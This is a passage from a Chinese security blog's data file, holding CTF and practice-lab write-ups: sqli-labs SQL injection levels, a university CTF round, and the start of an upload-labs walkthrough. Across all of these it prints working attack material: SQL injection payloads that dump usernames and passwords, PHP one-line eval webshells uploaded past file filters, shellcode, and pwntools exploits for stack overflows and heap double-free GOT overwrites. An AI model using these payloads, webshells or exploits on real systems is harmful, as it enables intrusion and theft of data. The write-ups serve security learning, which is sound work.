updatexml(1,concat(&#39;#&#39;,(database())),0),&#39;&#39;)# 爆表：Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;)# 爆表：Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;)# 爆内容：Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;)# Less-20原文：https://www.jianshu.com/p/f77ab78dcd35 分析登录失败 登录成功 回显有User-Agent、IP这样从当次Request直接获取的， 也有Cookie这样刷新页面后仍存在的， 还有登录用户的id、username、password。 最下方是删除Cookie的按钮，点击后刷新到初始界面。 使用Chrome插件EditThisCookie查看存储的Cookie信息： 可以看到只存储了uname这一个字段的信息，且是明文存储。修改Cookie后刷新界面： 便可以得知整个后台流程： 登陆后将uname写入Cookie。 在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。 在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在… 可以判断出注入点就在Cookie处，但是这里注入有两种途径： 用Chrome插件EditThisCookie修改本地Cookie文件注入。 用Burp修改登陆(POST)成功后刷新时GET请求头中的Cookie值注入，这种方式不会修改本地的Cookie文件。 接下来将重点演示第一种途径的注入。 注入过程我们得出后台根据Cookie中的uname查询用户的所有信息，即这是个SELECT语句，我们可以使用最简单的UNION注入。 uname=Dumb&#39; uname=Dumb&#39; order by 3#回显正确，说明有三个字段。 uname=1&#39; union select 1,2,3# 猜测SQL语句，然后看下源码 $sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”; 爆库 uname=1’ union select 1,2,database()#` 爆表 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;# 爆列 1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;# 爆内容 1&#39; union select 1,2,group_concat(concat(&#39;-&#39;,id,username,password)) from users# 同样burpsuite也可以， 总算把前20关写完了。多亏了Hyafinthus的题解。 Less-21 to Less30Less-21分析还是和上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，uname=Dumb变成了uname = RHVtYg== 很明显是将Dumb进行base64编码，可以在线测试一下，base64编码之后验证了确实是Dumb的base64编码，查看cookie之后，发现也是base64编码的， 注入开始注入，发现了一个问题， uname=Dumb’ base64在线加密Dumb&#39;后,即base64(Dumb’)=RHVtYiUyNw== 用这个值去修改cookie值之后，发现会有如下警告，猜测是base64最后的表示问题 所以，写一个简单的python脚本 1234import base64str1=&quot;Dump&#x27;&quot;str2=base64.b64encode(str1)print(str2) uname=Dumb’ base64=RHVtcCc= 直接得出 SQL 语句： 1SELECT * FROM table_name WHERE username=(&#x27;$cookie_uname&#x27;) LIMIT 0,1 即单引号加括号闭合 爆库 uname=1&#39;) union select 1,2,database()# base64: RHVtcCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM= 爆表 uname=1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=security&#39;# base64: RHVtYicpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9c2VjdXJpdHknIw== 爆列 uname = 1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;# base64: MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lPSd1c2Vycycj 爆内容 uname=1&#39;) union select 1,2,group_concat(concat_ws(&#39;-&#39;,id,username,password)) from user# base64: MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbmNhdF93cygnLScsaWQsdXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzIw== Less-22uname=1&quot;双引号闭合，其他和Less-21一样。 Less-23作者：Hyafinthus 链接：https://www.jianshu.com/p/2602430f8ee4 分析id=1&#39; 可以看出是单引号闭合的查询，这里报错还把站点路径爆出来了。 看了看源码，发现有preg_replace() 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); preg_replace(pattern,replacement,subject[,limit=-1[,&amp;count]]) preg_replace()函数执行一个正则表达式的搜索和替换，搜索subject中匹配pattern的部分， 以replacement进行替换。 如果subject是一个数组，preg_replace()返回一个数组，其他情况下返回一个字符串。 如果匹配被查找到，替换后的subject被返回，其他情况下返回没有改变的subject。如果发生错误，返回NULL。 在这关中，也只是将#和--替换成了空字符。 判断字段数时问题来了：尝试两种注释方式发现报错回显中LIMIT语句仍在起作用，注释没有起作用，即使把#URL编码为%23仍被过滤。 这时就要分析 SQL 语句找到绕过注入的方式，后台的查询语句是这样的： 1SELECT * FROM table_name WHERE id=&#x27;$id&#x27; LIMIT 0,1 注入点在id处，我们要判断字段数用的是order by子句，同时闭合第二个单引号： SELECT * FROM table_name WHERE id=1’ order by 4 and ‘1’=’1 LIMIT 0,1 本意是能从报错信息判断查询返回表共有几个字段，但是回显很正常： 这是因为： where与order by是子句，and是操作符，用于where子句。 在MySQL的执行顺序中，where是远在order by前面的。 在第一个查询语句中，id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;作为where的条件，先被执行，得到结果集；然后是order by，因结果集中无第四个字段所以报错。 在第二个查询语句中，order by在where的条件中，在where执行时被忽略了，结果集生成后并未再执行order by。 所以这关不能用order by来判断字段数，而要用union： SELECT * FROM table_name WHERE id=’1’ union select 1,2,3,4 or ‘1’=’1‘ LIMIT 0,1 这里的or作为了联合查询第二个语句的条件而不是第一个语句where的条件。 ?id=1&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1 当select加到4时报错，得出共3个字段。 注入时闭合查询语句即绕过过滤如下： SELECT * FROM table_name WHERE id=’-1’ union [select c_1,c_2,(c_3] or ‘1’=’1‘) LIMIT 0,1 这里id等于-1在 Less 1 中解释过，使原查询左边为空，使我们定义的查询结果返回。 注意：这里的or &#39;1&#39;=&#39;1&#39;是作为column_3的操作符，因其为永真条件，在column_3回显处会显示1，所以不能在column_3处注入。 ?id=-1&#39; union select 2,3,4 or &#39;1&#39;=&#39;1 回显如下 所以唯一的回显字段便是username即column_2，这也是唯一的注入点。 注入爆库 ?id=-1&#39; union select 1,database(),3 or &#39;1&#39;=&#39;1 爆表 ?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1 爆列 ?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1 爆内容 ?id=-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,password)) from users),3 or &#39;1&#39;=&#39;1","categories":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/categories/SQL/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"CUMMT双月赛二","slug":"大学CTF/CUMT双月赛二","date":"2019-01-24T07:05:11.000Z","updated":"2019-05-09T09:56:35.426Z","comments":true,"path":"2019/01/24/大学CTF/CUMT双月赛二/","link":"","permalink":"http://example.com/2019/01/24/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%BA%8C/","excerpt":"前言By 窝不管窝的flag都队 放假之后，荒废在家，参加一下月赛。","text":"前言By 窝不管窝的flag都队 放假之后，荒废在家，参加一下月赛。 MISCmisc签到 有很多的提示，然后下载压缩包 然后上网看看盲文符号，与图片一一对应得到BAIND，提交是不对的，提示中说a和1是一样的，把a换成1即可。 BXS的图标真好看查看题目，下载一个压缩包，解压后是一个.txt文件， 更改文件后缀名为.jpg或者.png 提示中提示到古典密码，简单观察这个字符串，猜测是栅栏密码， base全家桶了解一下？？base64解码 - base32解码 - base16解码 得到flag 矿大校歌认真听听吧？一个 ZIP 压缩包，需要密码，先不管三七二十一拖到 Kali Linux 里，还是有密码，说明不是伪加密。 用 010 Editor 打开，在最后看到了： 1cumtctf2019 这很可能是解压密码，试了下果然是。 解压出来一个 MP3 文件，直接用 MP3Stego 工具，猜测密码和解压密码一致，则在 cmd 中输入以下命令： 1Decode -X cumt.mp3 -P cumtctf2019 得到一个 .txt 文本文件，里面有我们要的 flag ： 1flag&#123;cumtctf_1s_v3ry_g00d!&#125; 起床改error啦唯一做到的Misc……队友Source太给力……拿到手是个png图片 丢进十六进制编辑器，发现猫腻，有zip文件头和flag信息； 扒下来另存为zip，解压得到flag.doc，但是里面没有flag； 提示直接告诉是doc隐写，那就显示隐藏文字即可，得到flag； Crypto现代密码签到没想到居然那么简单 QAQ。就是两次 DES 加密，密钥为空（缺省，比特全 0）。 题目： 123U2FsdGVkX1+p43JX7+KrdUBXg/UTw+ejas2dbmiVanvVSxOuhSdp3JLc+7G4zK5phHvL/5MHRKFV/L2THW1XCylB3U+pxCxbmnpQ2RB2ZTU=U2FsdGVkX1+p43JX7+KrdUBXg/UTw+ejas2dbmiVanvVSxOuhSdp3JLc+7G4zK5phHvL/5MHRKFV/L2THW1XCylB3U+pxCxbmnpQ2RB2ZTU= 在线工具：https://www.sojson.com/encrypt_des.html 解密一次得到： 1U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg== 再解密一次得到： 1cumtctf&#123;double_D3s_HHH&#125; 古典密码签到题目： 1LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A= 大写字母、数字、=，猜测是 base32 。 解下得到： 123^pho^oav`tZnj`tZZZcccx 看不出什么，但都是可打印字符，方向应该没错。 猜测移位，使用工具恺撒爆破 发现： 123^umt^tfa`yEso`yEEEhhhc 猜测 ^ 代表 c ，但是另一种字符代表什么无从而知，而且有换行，就很奇怪。后来灵感一来，可能是直接在 ASCII 范围内移位，偏移量 5，于是就有了以下 Python 脚本： 123456789# -*- coding:utf-8 -*-import base64c = base64.b32decode(&quot;LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A=&quot;)s = &quot;&quot;for x in c: s += chr((ord(x)+5)%128)print s 运行结果： 这个不可打印字符是啥？这个后来是靠猜的。一开始根据上下文觉得是 as 的变体，为什么说是“变体”？因为 s 已经在其他字符中出现的，在这里以这种形式出现就很奇怪，后来试了 a5 （因为 0x0f 是15，而 1 可代表 a）失败了。后来再试试 as ，居然对了，故最终 flag 是： 1cumtctf&#123;easy_soeasy___hhh&#125; 后来发现换行 \\n 其实是两个字符，分别对应明文 a 和 s。 easyrsa看到 e = 5 ，猜测考察的是 RSA 低加密指数攻击。 先统计下 n 中有哪些字符： 序号 字词 频次 频率 % 1 5 31 10.8392 2 4 28 9.7902 3 0 27 9.4406 4 9 27 9.4406 5 A 25 8.7413 6 b 25 8.7413 7 1 23 8.042 8 7 23 8.042 9 2 21 7.3427 10 6 19 6.6434 11 8 19 6.6434 12 3 18 6.2937 猜测是十二进制，A 代表十进制 10， b 代表十进制 11。故可以直接写出 Python 脚本： 12345678910111213141516171819202122232425262728293031# -*- coding:utf-8 -*-import gmpy2def Trans(n): ans = 0 l = len(n) for i in range(l): if n[i].isdigit(): ans += int(n[i]) elif n[i] == &#x27;A&#x27;: ans += 10 else: ans += 11 ans *= 12 return ans/12n = &quot;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&quot;e = &quot;5&quot;c = &quot;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&quot;n = Trans(n)e = Trans(e)c = Trans(c)i = 0while 1: if(gmpy2.iroot(c+i*n, e)[1] == True): x = gmpy2.iroot(c+i*n, e)[0] print &#x27;&#123;:x&#125;&#x27;.format(x).decode(&#x27;hex&#x27;) break i += 1 运行结果： 1cumtctf&#123;12_jinzhi_rsa&#125; playfir题目告诉我们这是 Playfair 密码： 12flaga=&#x27;flaga*******&#x27; key1=**** c1=DMBCCVTLMNKQflagb=&#x27;flagb*******&#x27; key2=**** c2=LRBECXPTCPHU 因为密钥只有 4 位，那就直接爆破，这样要枚举 $4^{25}$ 个密钥，也不算多，出题人应该不会把密钥字符设为重复的，这样我们就直接跳过密钥中有重复字符的情况。实际上，即使密钥不同，也可能出现解出来明文相同的情况，这样我们可以使用数据结构 set 去重，这样我们在后期找真正明文的时候会容易些。 以前没写过这种密码的脚本，脚本可以从网上 down（我下的脚本有点bug，但是至少可以用），然后改改，这是一种节省时间其实是懒的方法。 上 Python 脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# -*- coding:utf-8 -*-def matrix(key): matrix=[] for e in key.upper(): if e not in matrix: matrix.append(e) alphabet=&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot; for e in alphabet: if e not in matrix: matrix.append(e) matrix_group=[] for e in range(5): matrix_group.append(&#x27;&#x27;) matrix_group[0]=matrix[0:5] matrix_group[1]=matrix[5:10] matrix_group[2]=matrix[10:15] matrix_group[3]=matrix[15:20] matrix_group[4]=matrix[20:25] return matrix_groupdef find_position(key_matrix,letter): x = y = 0 for i in range(5): for j in range(5): if key_matrix[i][j] == letter: x = i y = j return x,ydef cipher_to_digraphs(cipher): i=0 new=[] for x in range(len(cipher)/2): new.append(cipher[i:i+2]) i=i+2 return newdef decrypt(cipher,key): cipher=cipher_to_digraphs(cipher) key_matrix=matrix(key) plaintext=[] for e in cipher: p1,q1=find_position(key_matrix,e[0]) p2,q2=find_position(key_matrix,e[1]) if p1==p2: if q1==4: q1=-1 if q2==4: q2=-1 plaintext.append(key_matrix[p1][q1-1]) plaintext.append(key_matrix[p1][q2-1]) elif q1==q2: if p1==4: p1=-1; if p2==4: p2=-1; plaintext.append(key_matrix[p1-1][q1]) plaintext.append(key_matrix[p2-1][q2]) else: plaintext.append(key_matrix[p1][q2]) plaintext.append(key_matrix[p2][q1]) for unused in range(len(plaintext)): if &quot;X&quot; in plaintext: plaintext.remove(&quot;X&quot;) output=&quot;&quot; for e in plaintext: output+=e return output.lower()def main(): key = &quot;&quot; s = set() table = &quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot; cipher = &quot;DMBCCVTLMNKQ&quot; for a in range(25): key = table[a] for b in range(25): key += table[b] for c in range(25): key += table[c] for d in range(25): key += table[d] r = &#x27;&#x27;.join(x for i, x in enumerate(key) if key.index(x) == i) if len(r) == 4 and &quot;flaga&quot; in decrypt(cipher,key): s.add(decrypt(cipher,key)) key = key[:3] key = key[:2] key = key[:1] key = key[0] for x in s: print xmain() 另一个改下密文，把 flaga 改成 flagb 也可以推出。接下来就开始筛选真正明文。 故连起来就是： 1flagaplayfirflagbyoudoit 在线求下 MD5 ，得到 flag： 1flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125; Web签到题SimpleUpoad签到拿到题目 查看源码，发现允许上传.jpg|.png|.gif文件 还提示flag.php在当前目录下 直接bp抓包，直接把.php类型文件改成可上传， 上传一句话木马 1&lt;?php eval($_POST[&#x27;ee&#x27;]); ?&gt;] 即可成功上传，然后菜刀连接，即可在当前目录下，找到flag.php文件 SimpleSQLi-1 输入**?id=1**，得到如下信息： 输入**?id=1’**,会报错。 注入的步骤是爆库，爆表，爆列 多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数所以我们闭合单引号构造payload:http://bxs.cumt.edu.cn:30007/test/index.php?id=1%27--+可以成功回显，说明猜测成功 用order by去猜列数http://bxs.cumt.edu.cn:30007/test/index.php?id=1%27%20order%20by%203%23 需要把第一句话弄成结果为空才能显示后面一句话的内容，可以选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了 用mysql里面自带的information_schema表 猜表名id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 猜列名id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#39;flagishere&#39;%23 看里面的内容http://bxs.cumt.edu.cn:30007/test/index.php?id=-1%27%20union%20select%201,2,concat_ws(%27%23%27,Id,flag)%20from%20flagishere%20limit%200,1%23 小型线上赌场一开始没有思路，毕竟是萌新还没有了解到CTF的很多姿势，后来得知是vim文件泄露，在vim编辑的时候没有正常退出，系统就会自动生成一个swp文件用来日后的恢复；直接down下来，vim打开得源码： 123456789101112131415&lt;?php $invest = $_GET[&#x27;invest&#x27;]; $rand = rand(2,50); $len = strlen(trim($_GET[&#x27;invest&#x27;])); foreach ($_GET as $key =&gt; $value) &#123; if(!is_numeric($value)||$value == &#x27;0&#x27;)&#123; die(&#x27;no no no!&#x27;); &#125; &#125; $money = number_format($invest*$rand); $money = intval(str_replace(&#x27;,&#x27;,&#x27;&#x27;,$money)); $guess = intval($_GET[&#x27;guess&#x27;]); if ($guess == $money &amp;&amp; strlen($money)===$len)&#123; echo $flag;&#125; 看懂源码意思即可，生成2~50的随机数rand，money为$invest*$rand；如果$money==$guess就回显flag，即invest*倍数==guess即可，那我们可以直接bp爆破，猜一个guess，固定invest和guess的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag； 截包，【Send to Intruder】，【Positions】下先【Clear】（因为我们填入的值不用变）。 在【Payload】下，将【Payload type】设为【Null payloads】，数量填写 2000 好了。 然后【Options】下也随便设置。 设置完成后，【Intruder】-【Start attack】开始爆破。 在结果【Result】下，按【Length】从低到高排序，可以看到长度为 905 的 Response 包里就有 flag 。 文件管理系统队友Source在离别歌的blog里搜索到类似题目，了解到这题的切入点是二次注入，直接拿来payload就可以搞定这一题； 先选择文件进行上传，filename为&#39;,extension=&#39;&#39;,filename=&#39;x.jpg.jpg； Rename file，注入后文件系统中文件名为xl.jpg.jpg 上传真的包含webshell的文件； 改名后缀为.php，连接菜刀即可； flag在根目录； Reverse逆向签到拖到 IDA 里，F5 查看类C伪代码，可以看出： 要输入 29 个字符。 rd 是 [0,99] 区间内的的随机整数 for() 循环中，每个字符与 rd 进行 xor 运算 Check() 函数中，检查每个 s[i] == a[i] 是否成立（byte 是一个字节，_DWORD 相当于 int，是四个字节） 随机数。。。随缘程序。 那就写个 Python 脚本： 12345678910# -*- coding:utf-8 -*-v5 = (53, 63, 50, 52, 40, 1, 50, 61, 55, 99, 62, 118, 98, 60, 60, 12, 106, 58, 37, 54, 12, 38, 12, 102, 48, 60, 33, 54, 46)for i in range(100): s = &quot;&quot; for j in range(29): s += chr(i^v5[j]) if &quot;flag&quot; in s: print s 运行结果： 1flag&#123;Rand0m%1oo_9ive_u_5core&#125; Easy_Math拖到 IDA 里，F5 查看类C伪代码，可以看出： 要输入 9 个字符。 String2Int() 函数将字符数组 a1 的 ASCII 赋给整型数组 a2 Check() 函数比较参数和 v2 = (274, 294, 316, 262, 274, 252, 380, 421, 427) 是否相等 最重要的就是这个 Change() 函数，比较复杂。 1234567891011121314151617181920212223242526272829303132333435363738//v5 = (1, 2, 1, 2, 1, 1, 1, 1, 2)//a是输入Change((__int64)&amp;a, (__int64)&amp;v5, (__int64)&amp;ans); //main()函数中调用void Change(__int64 a, __int64 v5, __int64 ans)&#123; _DWORD *result; // rax@3 signed int m; // [sp+24h] [bp-14h]@10 signed int l; // [sp+28h] [bp-10h]@9 signed int k; // [sp+2Ch] [bp-Ch]@7 signed int j; // [sp+30h] [bp-8h]@2 signed int i; // [sp+34h] [bp-4h]@1 //ans[3*i+j] = 0 //3i+j = 0, 1, 2, 3, 4, 5, 6, 7, 8 for ( i = 0; i &lt;= 2; ++i ) &#123; for ( j = 0; j &lt;= 2; ++j ) &#123; result = (_DWORD *)(4 * (3 * i + (signed __int64)j) + ans); *result = 0; &#125; &#125; //ans[3*i+j] += v5[3*k+j]*a[3*i+k] //v5已知，a未知，ans(v2)已知 for ( i = 0; i &lt;= 2; ++i ) &#123; for ( j = 0; j &lt;= 2; ++j ) &#123; for ( k = 0; k &lt;= 2; ++k ) &#123; resujt = (_DWORD *)(4 * (3 * i + (signed __int64)j) + ans); *resujt += *(_DWORD *)(4 * (3 * k + (signed __int64)j) + v5) * *(_DWORD *)(4 * (3 * i + (signed __int64)k) + a); &#125; &#125; &#125;&#125; 接下来，解九元一次方程组（三个三个一组）可得到 flag 。 pwnWelcomehow 显然是栈溢出，search一下控制栈指针的语句发现： 但是后面只有50-0x20-4-4 = 10个字节，不够写shellcode。 窝们可以将shellcode写在前面，覆盖eip为0x8048504，后接esp-（4(eip) + 4(ebp) + 0x20 = 0x28）,再jmp esp(shellcode)即可。 exp1234567891011from pwn import *context.clear(arch=&#x27;i386&#x27;)#shellcode = asm(shellcraft.sh())too longQAQ...shellcode = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;#x86#p = remote(&#x27;47.106.211.189&#x27;, 10000)p = process(&#x27;./Welcome&#x27;)p.recvuntil(&#x27;What\\&#x27;s your name?\\n&#x27;)p.sendline(shellcode + (0x20-len(shellcode)+4)*&#x27;a&#x27; + p32(0x08048504) + asm(&#x27;sub esp, 0x28\\njmp esp&#x27;))p.interactive() login文件里包含一大堆加密、hash函数，一开始都看懵了，其实。。。不重要。 分析 主函数： 输入长度不超过12，一波验证看下来，发现根本不可能通过验证的（所以这不是re是pwn啊，pia！）。 将输入copy至ebp-8h（4字节）处 其中，input在bss段！易得到其地址：.bss:0811EB40 ... corret里得到call system(‘\\sh’)地址 .text:0804928B call system how 输入最长12字节 -&gt; 任意填充4字节 +system_addr的4字节 +(buffer_addr+4-4)覆盖ebp的4字节，刚刚好~ exp1234567891011from pwn import *import base64p = process(&#x27;./login&#x27;)#p = remote(&#x27;47.106.211.189&#x27;, 10001)p.recvuntil(&quot;Authenticate :&quot;)p.sendline((p32(0xdeadbeef) + p32(0x08049284) + p32(0x0811EB40)).encode(&quot;base64&quot;))#payload,shell,bufferp.interactive() brainfxxk分析一种。。。语言？可以控制(bss段)指针p±1，指针p对应内容±1以及输入输出。 GOT表就在附近，一共可输入1024字节，足够为所欲为了。 有libc文件，leak出putchar的地址算出其他地址，花式修改got表而后fgets(“\\sh\\x00”)即可。 exp1234567891011121314151617181920212223from pwn import *context.log_level=&quot;debug&quot;#p=remote(&#x27;47.106.211.189&#x27;, 10002)p = process(&quot;./brainfxxk&quot;)elf = ELF(&quot;./brainfxxk&quot;)libc = ELF(&quot;./libc.so.6&quot;)p.recvuntil(&quot;Type brainfuck instructions below:\\n&quot;)p.sendline(&quot;.&quot; #call putchar to fill the got_putchar with its real_addr.+ &quot;&lt;&quot;*(0x70+1) + &quot;&gt;.&quot;*4#leak putchar_addr.+ &quot;&lt;&quot;*8+&quot;&gt;,&quot;*8+&quot;&lt;&quot;*0x24+&quot;&gt;,&quot;*4#memset(gets),putchar(main),fgets(system).+ &quot;.&quot;)#call mainp.recv(1)base = u32(p.recv(4)) - libc.symbols[&quot;putchar&quot;]#print basep.send(p32(libc.symbols[&quot;gets&quot;] + base) + p32(0x8048671) + p32(libc.symbols[&quot;system&quot;] + base))p.recvuntil(&quot;Type brainfuck instructions below:\\n&quot;)p.sendline(&quot;\\sh\\x00&quot;)p.interactive() babynoteyt聚(ba)聚(by)的小本本。 howfastbin attack，delete函数里没有把指针置0,因此可通过double free构造uaf，修改指针(注意size)，覆盖got_free。 但是没有system也没libc，后来乱点发现有个magic函数可以直接读取flag（多么灵性の函数名，I’m so 瞎）。于是，把got_free覆盖为magic，再free任意chunk即可。 exp12345678910111213141516171819202122232425262728293031323334353637from pwn import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babynote&#x27;)p = remote(&#x27;47.106.211.189&#x27;, 10003)def create(size,name,con): p.recvuntil(&#x27;Your choice : &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;Length of the name :&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;The name of note :&#x27;) p.send(name) p.recvuntil(&#x27;The content of the note:&#x27;) p.send(con)def free(index): p.recvuntil(&#x27;Your choice : &#x27;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Which note to delete:&#x27;) p.sendline(str(index))magic = p64(0x400C7B)create(0x50,&#x27;yt\\n&#x27;, &#x27;ju(ba)\\n&#x27;)create(0x50,&#x27;ju(by)\\n&#x27;, &#x27;ni\\n&#x27;)free(0)free(1)free(0)#gdb.attach(p)create(0x50,p64(0x601ffa)+&#x27;\\n&#x27;,&#x27;jing\\n&#x27;)create(0x50,&#x27;ran\\n&#x27;,&#x27;chu\\n&#x27;)create(0x50,&#x27;yuan\\n&#x27;,&#x27;ti\\n&#x27;)create(0x50,&#x27;a&#x27;*14+magic,&#x27;-w-\\n&#x27;)free(3)p.interactive() Web签到题是个简单的绕过，给出源码： 123456789101112131415161718192021222324252627282930&lt;?php$white_list = range(0,9);require_once(&#x27;flag.php&#x27;);if(isset($_REQUEST[&#x27;0ver&#x27;]) &amp;&amp; isset($_REQUEST[&#x27;0ver1&#x27;]) &amp;&amp; isset($_REQUEST[&#x27;0ver2&#x27;]))&#123; $a = $_REQUEST[&#x27;0ver&#x27;]; $b = $_REQUEST[&#x27;0ver1&#x27;]; $c = $_REQUEST[&#x27;0ver2&#x27;]; if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123; echo &#x27;no must be number&#x27;; &#125;else&#123; if(in_array($a,$white_list))&#123; if(strlen($a)&gt;1)&#123; if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; echo &quot;&lt;img src=&#x27;dark.png&#x27;&gt;&lt;br&gt;&quot;; echo &#x27;you are a great dark phper&lt;br&gt;&#x27;; echo $flag; &#125; else&#123; echo &quot;you can do it!!!&quot;; &#125; &#125;else&#123; echo &#x27;you no dark&#x27;; &#125; &#125;else&#123; echo &#x27;you are so dark&#x27;; &#125; &#125; &#125;else highlight_file(__FILE__); 考察ereg()和md5()的绕过姿势，00截断绕过ereg，上传数组绕过md5，即可得到flag如下： payload：http://202.119.201.199:32790/index.php?0ver=5%00a&amp;0ver1[]=a&amp;0ver2[]=b","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"Upload_labs文件上传靶场通关","slug":"靶场/Upload-labs文件上传靶场通关","date":"2018-12-20T13:30:47.000Z","updated":"2019-04-12T02:34:15.946Z","comments":true,"path":"2018/12/20/靶场/Upload-labs文件上传靶场通关/","link":"","permalink":"http://example.com/2018/12/20/%E9%9D%B6%E5%9C%BA/Upload-labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/","excerpt":"前言学习一下文件上传","text":"前言学习一下文件上传 Pass-01这题的目的是前端的绕过 打开题目，试一下，随便上传一张图片，可以成功上传 打开代理，bp抓包，上传含有一句话木马的1.php，发现一个问题此时，已经打开了代理，bp把流量截了下来，但是却给出了，错误提示，说明这是一个JS前段验证 F12修改前端代码，添加.php文件的验证 即可成功，也可以禁用js，也可以成功上传.php文件，然后用菜刀连接即可 修改后缀名也可以绕过，上传一句话木马,文件名为ee.jpg 1&lt;?php eval($_Psot[&#x27;ee&#x27;]); ?&gt; bp抓包后，修改后缀名为.php,即可成功上传.php文件 使用菜刀连接即可， Pass-02查看源码，发现仅仅判断content-type，于是修改content-type绕过 修改为image/jpeg、image/png、image/gif任何一个都可以，就可以成功上传.php文件 bp抓包，修改文件后缀名也可以 Pass-03查看源码，发现是黑名单验证，对.asp|.aspx|.php|.jsp后缀名进行了严格的限制 只能上传别的类型，于是尝试用php3,phtml绕过，都可以成功上传 源码解析 1234567891011121314151617181920212223242526$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);//trim()去点文件的空格 $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;);//查找字符在指定字符串中从左面开始的最后一次出现的位置，如果成功，返回该字符以及其后面的字符 $file_ext = strtolower($file_ext); //转换为小写这样就不能进行大小写的逃逸了 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; if 